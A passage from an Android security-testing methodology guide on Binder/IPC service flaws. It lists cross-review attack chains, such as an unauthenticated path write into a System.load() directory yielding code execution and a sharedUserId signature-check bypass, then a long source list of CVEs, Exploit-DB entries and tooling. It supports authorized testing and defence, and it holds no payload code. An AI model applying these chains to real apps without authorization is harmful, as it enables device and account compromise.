- **D06 × D17 — the unauthenticated method that writes where the loader reads.** Dynamic-code-loading
  review lists the directories the app `System.load()`s from. IPC review lists the methods that take a
  path. Cross the two lists and the intersection is an RCE (D06-030). Neither list is interesting alone,
  and neither reviewer usually sees the other's.
- **D06 × D22 × D21 — the Android 15 FGS restriction that silently disarms a security control.** Version
  behaviour review notes the compat flags; resilience review notes the control exists. The join is that
  the control is re-armed from a `BOOT_COMPLETED` receiver starting a restricted FGS type (D06-039), so on
  Android 15 it throws and never re-arms — and the app's fallback (a `specialUse` FGS, a notification
  trampoline, a newly visible overlay) is a fresh attack surface nobody reviewed.
- **D06 × D03 × D02 — the signature check that is not one.** Permission review checks protection levels;
  signing review checks v3.1 rotation. The join: a service whose caller check is
  `checkSignatures()`-based (D06-020) is sound only while the rotation story holds, and a `sharedUserId`
  family (D06-021) means the *weakest* app in the family passes it. Three reviews, one bypass.
- **D06 × D26 — the process you did not instrument.** Tooling review sets up Frida; IPC review writes the
  hooks. If the service runs in `:remote` (D06-004) and you attached to the main process, every hook
  reports "no caller check reached" — a false negative that looks exactly like a clean result. This join
  is the most common way a D06 engagement produces a confidently wrong negative.

## Sources

- **AOSP and platform documentation** (via `architecture/aosp-core.md`, `architecture/framework-internals.md`,
  `architecture/security-model.md`): AIDL overview and the `transact(code, data, reply, flags)` model;
  Binder threading, the per-process threadpool and `oneway` semantics; the three binder domains
  (`/dev/binder`, `/dev/hwbinder`, `/dev/vndbinder`) and `ProcessState::initWithDriver`; `android.os.Binder`
  (`getCallingUid`, `getCallingPid`, `getCallingUidOrThrow`, `clearCallingIdentity`/`restoreCallingIdentity`,
  `linkToDeath`, `isBinderAlive`, `FLAG_ONEWAY`); `TransactionTooLargeException`; `ParcelFileDescriptor`;
  `NotificationListenerService.java`; the AOSP security-model paper Table 2 (isolated process, Android 4.1)
  and SELinux concepts/device-policy.
- **developer.android.com risk and guide pages:** access-control-to-exported-components; intent-redirection
  ("Common Mistakes to Avoid"); sender-of-pending-intents; insecure-machine-to-machine;
  insecure-broadcast-receiver; tapjacking; security-tips (Binder/Messenger, `checkCallingPermission()`,
  never implicit `bindService()`); bound services; intents-and-filters (implicit-service hazard);
  foreground-service types; behaviour changes for Android 13 (SDK-declared permissions auto-merging into
  the app manifest), 14 and 15 (`FGS_INTRODUCE_TIME_LIMITS`,
  `FGS_BOOT_COMPLETED_RESTRICTIONS`, `FGS_SAW_RESTRICTIONS`, `BIND_ALLOW_ACTIVITY_STARTS`); quick-settings
  tiles; slices; app widgets; app startup; WorkManager and `JobScheduler`; autofill services; accessibility
  services; `MediaBrowserService`; Android for Cars; Wear Data Layer.
- **OWASP MASTG/MASVS/MASWE** (`primary/owasp-mastg.md`, `primary/owasp-mobile-top10.md`): MASTG-TEST-0365,
  MASTG-TEST-0029 (deprecated — source of the Sieve `AuthService` walkthrough), MASTG-TEST-0007,
  MASTG-TEST-0005, MASTG-TECH-0161, MASTG-TECH-0023, MASTG-TECH-0028, MASTG-TECH-0042, MASTG-TECH-0043,
  MASTG-KNOW-0020, MASTG-KNOW-0133, MASTG-BEST-0052, MASTG-TOOL-0001, MASTG-TOOL-0015; MASWE-0018, -0019,
  -0023, -0032, -0036, -0037, -0039, -0040, -0050, -0069; MASVS-PLATFORM-1; Mobile Top 10 2024 M3/M4/M8.
- **Bugcrowd VRT release 2026-07-08** (`data/bugcrowd-vrt-full.csv`, 581 entries) for every VRT path and
  priority quoted in this chapter, including the null-rated
  `broken_access_control.exposed_sensitive_android_intent` node and its own remediation text on implicit
  service intents.
- **MITRE ATT&CK Mobile** (`data/mitre-attack-mobile-android.csv`): T1575, T1623, T1635, T1626, T1663,
  T1604, T1638, T1428, T1541, T1517, T1636.004, T1513, T1516; mitigation M1012.
- **Exploit-DB / CVE corpus** (`primary/exploitdb-cve-patterns.md`): CVE-2015-7889 (EDB 38558, Samsung
  `QuickReplyService`); CVE-2017-13236 (EDB 43996), CVE-2017-13209 (EDB 43513), CVE-2019-2023 (EDB 46504)
  and EDB 40381 for the `getpidcon`/PID-reuse class.
- **Mobile Hacking Lab** (`primary/mobilehackinglab.md`): CVE-2026-0047 — raw `IBinder.transact()` as a
  hidden-API bypass, the NPE-versus-`SecurityException` oracle, the `dump*Proto` / CWE-280 family, the
  pipe-management detail, and `lab-cyclic-scanner` (unprotected-service hijack).
- **Disclosed reports and vendor research** (`realworld/h1-disclosed-mobile.md`,
  `secondary/writeups-realfinds.md`): H1 #258460 (Quora — `net.gotev.uploadservice` arbitrary file and URL,
  plus the researcher's own `visibleToInstantApps` correction); H1 #384257 (Zomato — exported service
  returning the access token); H1 #146179 (ownCloud — exported `AccountAuthenticatorService` and
  `FileSyncService`); Oversecured TikTok `IndependentProcessDownloadService.tryDownload()` → `app_lib` →
  `System.load()`; Oversecured banking/fintech ATO class "AIDL Interface Abuse"; Oversecured Samsung
  system-privilege-escalation IDs 145/149/150/156/166/177.
- **Michał Bednarski's parcel research** (`frontier/undertested-surfaces.md`): ReparcelBug2 (CVE-2021-0928),
  LeakValue (CVE-2022-20452), TheLastBundleMismatch (CVE-2023-45777) and the four mismatch warning signs.
- **Tooling corpora** (`secondary/frida-drozer-tooling.md`, `secondary/hrishikesh-hacktricks.md`,
  `secondary/sehno-gowthams.md`, `secondary/indusface-singh-riya.md`, `secondary/sallam-hetmehta.md`,
  `secondary/extra-community-sources.md`): verified drozer `app.service.info` / `app.service.start` /
  `app.service.stop` / `app.service.send` flags including `--bundle-as-obj`; objection
  `android hooking list services` and `android intent launch_service`; the Frida `onTransact` and
  `getCallingUid` hooks; HackTricks binder confused-deputy and Shizuku material.
- **Local senior-researcher corpus** (`local/skill-corpus-classes.md`, `local/skill-corpus-method.md`):
  gRPC-over-binder `SecurityPolicy` tracing (including the verified-holding SafetyHub
  `START_EMERGENCY_SHARING` and wear-companion cases), the Dagger/tiktok wrapper-to-delegate rule, the
  privileged-listener "validated action, unvalidated caller" class, and the `onBind`-with-no-caller-check
  → `app_lib` write → RCE chain.
- **Google and Samsung programme rules** (`primary/vrp-program-economics.md`): the "unprotected services"
  class and its remediation; the invalid-report entries for exported components and for provider SQL
  injection with no privilege boundary; the Android & Google Devices in-scope items "unprivileged
  background Foreground Service (FGS) launches to gain while-in-use permissions", "While-In-Use (WIU)
  Abuse" and "Cross-user sensitive data access".
- **`secondary/claude-bughunter.md`** (4,467-star bug-hunting corpus): the layer-ordering trap, marker
  discipline, the body-diff rule, the statistical-sample rule, the shell-loop ban, the shadow-API
  behavioural diff, the five-screenshot state-change pattern, cookie/HAR sanitising and the PII split, the
  pre-severity gate, retraction versus patched-mid-engagement discipline, and chain-filing order.
- **This repository's own doctrine:** `docs/02-severity-and-reportability.md` (the graveyard and the
  precondition ladder), `docs/05-attacker-models.md` (AM-03 requires a PoC app, not adb),
  `docs/07-coverage-crosswalk.md`, `ISSUES.md` Phase 3/4/5 entry and exit conditions.
